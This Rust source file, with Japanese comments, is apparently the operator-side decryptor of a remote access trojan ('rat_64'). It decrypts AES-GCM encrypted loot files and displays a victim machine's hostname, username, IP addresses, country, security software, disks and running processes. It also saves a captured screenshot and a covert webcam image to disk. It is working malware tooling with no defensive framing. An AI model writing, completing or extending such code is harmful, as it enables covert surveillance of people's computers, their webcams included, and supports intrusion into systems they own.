use std::env;
use std::fs;
use std::error::Error;
use base64::{engine::general_purpose, Engine as _};
use aes_gcm::{Aes256Gcm, Nonce, aead::{Aead, KeyInit}};
use rmp_serde::decode::from_slice as from_msgpack_slice;
use rat_64::FullSystemData;

fn main() -> Result<(), Box<dyn Error>> {
    let args: Vec<String> = env::args().collect();
    
    if args.len() < 2 {
        eprintln!("Usage: {} <encrypted_data.dat> [encryption_key.dat]", args[0]);
        eprintln!("Examples:");
        eprintln!("  {} encrypted_data.dat                    # use encryption_key.dat automatically", args[0]);
        eprintln!("  {} encrypted_data.dat my_key.dat        # use specified key file", args[0]);
        return Ok(());
    }

    let data_file = &args[1];
    let key_file = args.get(2).map(|s| s.as_str()).unwrap_or("encryption_key.dat");

    println!("復号化中: {}", data_file);
    println!("キーファイル: {}", key_file);

    // 暗号化データ読み込み（バイナリ）
    let encrypted_data = match fs::read(data_file) {
        Ok(data) => data,
        Err(e) => {
            eprintln!("❌ データファイルの読み込みに失敗: {}", e);
            return Ok(());
        }
    };

    // キーファイル読み込み
    let key_content = match fs::read_to_string(key_file) {
        Ok(content) => content,
        Err(e) => {
            eprintln!("❌ キーファイルの読み込みに失敗: {}", e);
            return Ok(());
        }
    };

    // キーとNonceの抽出
    let (key, nonce) = match parse_key_file(&key_content) {
        Ok((k, n)) => (k, n),
        Err(e) => {
            eprintln!("❌ キーの解析に失敗: {}", e);
            return Ok(());
        }
    };

    // AES-GCM復号化（バイナリデータ直接）
    let cipher = Aes256Gcm::new(aes_gcm::Key::<Aes256Gcm>::from_slice(&key));
    let decrypted_data = match cipher.decrypt(Nonce::from_slice(&nonce), encrypted_data.as_slice()) {
        Ok(data) => data,
        Err(e) => {
            eprintln!("❌ 復号化に失敗: {:?}", e);
            return Ok(());
        }
    };

    // MessagePack復号化
    let full_data: FullSystemData = match from_msgpack_slice(&decrypted_data) {
        Ok(data) => data,
        Err(e) => {
            eprintln!("❌ MessagePack復号化に失敗: {}", e);
            return Ok(());
        }
    };

    let system_info = &full_data.system_info;

    // システム情報表示
    println!("\n=== システム情報 ===");
    println!("🏠 ホスト名: {}", system_info.hostname);
    println!("💻 OS: {} {}", system_info.os_name, system_info.os_version);
    println!("👤 ユーザー: {}", system_info.username);
    println!("⚙️ CPU: {} ({} cores)", system_info.processor, system_info.cores);
    println!("💾 メモリ: {:.1}GB / {:.1}GB", 
        system_info.available_memory as f64 / 1024.0 / 1024.0 / 1024.0,
        system_info.total_memory as f64 / 1024.0 / 1024.0 / 1024.0);
    println!("🌐 ローカルIP: {}", system_info.local_ip);
    println!("🌍 グローバルIP: {}", system_info.global_ip);
    println!("🏛️ 国コード: {}", system_info.country_code);
    println!("🕐 タイムゾーン: {}", system_info.timezone);
    println!("🗣️ 言語: {}", system_info.language);
    println!("🏗️ アーキテクチャ: {}", system_info.architecture);
    
    if !system_info.security_software.is_empty() {
        println!("🔒 セキュリティソフト: {:?}", system_info.security_software);
    }

    if !system_info.disk_info.is_empty() {
        println!("\n💿 ディスク情報:");
        for disk in &system_info.disk_info {
            println!("  {} ({}) - {:.1}GB / {:.1}GB", 
                disk.name, 
                disk.file_system,
                disk.available_space as f64 / 1024.0 / 1024.0 / 1024.0,
                disk.total_space as f64 / 1024.0 / 1024.0 / 1024.0);
        }
    }

    if !system_info.running_processes.is_empty() {
        println!("\n📊 プロセス情報 (上位{}個):", system_info.running_processes.len());
        for process in &system_info.running_processes {
            println!("  {} (PID: {}) - {:.1}% CPU, {:.1}MB RAM", 
                process.name, 
                process.pid,
                process.cpu_usage,
                process.memory_usage as f64 / 1024.0 / 1024.0);
        }
    }

    // スクリーンショット保存
    if !full_data.screenshot.is_empty() {
        match save_screenshot(&full_data.screenshot) {
            Ok(filename) => println!("\n📸 スクリーンショットを保存: {}", filename),
            Err(e) => eprintln!("\n❌ スクリーンショット保存失敗: {}", e),
        }
    } else {
        println!("\n📸 スクリーンショット: なし");
    }

    // Webカメラ画像保存
    if !full_data.webcam_image.is_empty() {
        match save_webcam_image(&full_data.webcam_image) {
            Ok(filename) => println!("📹 Webカメラ画像を保存: {}", filename),
            Err(e) => eprintln!("❌ Webカメラ画像保存失敗: {}", e),
        }
    } else {
        println!("📹 Webカメラ画像: なし");
    }

    println!("\n✅ 復号化完了！");
    Ok(())
}

fn parse_key_file(content: &str) -> Result<([u8; 32], [u8; 12]), Box<dyn Error>> {
    let mut key_b64 = String::new();
    let mut nonce_b64 = String::new();

    for line in content.lines() {
        if line.starts_with("KEY:") {
            key_b64 = line[4..].to_string();
        } else if line.starts_with("NONCE:") {
            nonce_b64 = line[6..].to_string();
        }
    }

    if key_b64.is_empty() || nonce_b64.is_empty() {
        return Err("キーまたはNonceが見つかりません".into());
    }

    let key_bytes = general_purpose::STANDARD.decode(&key_b64)?;
    let nonce_bytes = general_purpose::STANDARD.decode(&nonce_b64)?;

    if key_bytes.len() != 32 {
        return Err("キーのサイズが無効です".into());
    }
    if nonce_bytes.len() != 12 {
        return Err("Nonceのサイズが無効です".into());
    }

    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    key.copy_from_slice(&key_bytes);
    nonce.copy_from_slice(&nonce_bytes);

    Ok((key, nonce))
}

fn save_screenshot(base64_data: &str) -> Result<String, Box<dyn Error>> {
    let filename = "screenshot.png";
    let image_data = general_purpose::STANDARD.decode(base64_data)?;
    fs::write(filename, image_data)?;
    Ok(filename.to_string())
}

fn save_webcam_image(base64_data: &str) -> Result<String, Box<dyn Error>> {
    let filename = "webcam.png";
    let image_data = general_purpose::STANDARD.decode(base64_data)?;
    fs::write(filename, image_data)?;
    Ok(filename.to_string())
}